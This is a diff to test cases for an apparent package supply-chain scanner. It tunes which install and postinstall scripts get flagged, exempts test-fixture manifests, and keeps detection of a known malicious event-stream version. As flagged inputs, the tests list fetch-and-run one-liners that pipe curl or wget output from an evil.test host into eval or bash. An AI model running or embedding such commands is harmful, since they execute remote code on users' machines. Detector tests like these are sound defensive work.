@@ -1459,6 +1459,12 @@ describe("install scripts that only look like dynamic code", () => {
       "node scripts/postinstall.js",
       "patch-package",
       "evaluate-metrics --once",
+      // A no-op guard. electron's root manifest carries exactly this to stop
+      // `npm install` doing anything, and it was scored critical. Matching
+      // only `process.exit(<digits>)` between the quotes, anchored at both
+      // ends, leaves nowhere to hide anything else.
+      `node -e 'process.exit(0)'`,
+      `node --eval "process.exit()"`,
     ]) {
       const result = await withScript(script)
       expect(
@@ -1472,7 +1478,6 @@ describe("install scripts that only look like dynamic code", () => {
     for (const script of [
       `eval "$(curl -fsSL https://evil.test/s)"`,
       `node -e "require('child_process').exec('id')"`,
-      `node --eval "process.exit()"`,
       `deno eval "fetch('http://evil.test')"`,
       `bash -c "$(wget -qO- http://evil.test/s)"`,
     ]) {
@@ -1807,5 +1812,56 @@ describe("reading the repo as one tarball", () => {
         result.scanSummary.skippedFiles.every((file) => file.reason === "over-file-limit")
       ).toBe(true)
     })
+  })
+})
+
+describe("lifecycle scripts under a test fixture", () => {
+  const manifest = JSON.stringify({
+    name: "fixture",
+    scripts: { postinstall: `node -e "require('child_process').exec('id')"` },
+  })
+
+  it("does not read a fixture's lifecycle scripts as an attack", async () => {
+    // pnpm and npm keep packages like this to exercise their own installers.
+    // Reading them as supply-chain findings scored pnpm/pnpm 1.000 and
+    // npm/cli 0.617 on the reference corpus.
+    for (const path of [
+      "exec/lifecycle/test/fixtures/with-many-scripts/package.json",
+      ".fixtures/packages/with-postinstall-a/1.0.0/package.json",
+      "workspaces/arborist/test/fixtures/link-dep-lifecycle-scripts/a/package.json",
+    ]) {
+      const result = await scan({ [path]: manifest })
+      expect(
+        result.findings.filter((f) => f.type === "POSTINSTALL_SCRIPT"),
+        `expected no postinstall finding for: ${path}`
+      ).toHaveLength(0)
+    }
+  })
+
+  it("still reads the same scripts outside a fixture", async () => {
+    const result = await scan({ "package.json": manifest })
+    expect(
+      result.findings.some((f) => f.type === "POSTINSTALL_SCRIPT" && f.severity === "critical")
+    ).toBe(true)
+  })
+
+  it("still flags a fixture that pins a known malicious package", async () => {
+    // The guard is on the lifecycle-script check only. A fixture that pins a
+    // package known to be malicious is still worth saying.
+    global.fetch = mockGitHubApi({
+      "test/fixtures/a/package.json": JSON.stringify({
+        name: "f",
+        dependencies: { "event-stream": "3.3.6" },
+      }),
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, {
+      signatures: {
+        ...EMPTY_SIGNATURES,
+        maliciousPackages: [
+          { name: "event-stream", version: "3.3.6", severity: "high", source: "test" },
+        ],
+      },
+    })
+    expect(result.findings.some((f) => f.type === "SUSPICIOUS_DEPENDENCY")).toBe(true)
   })
 })
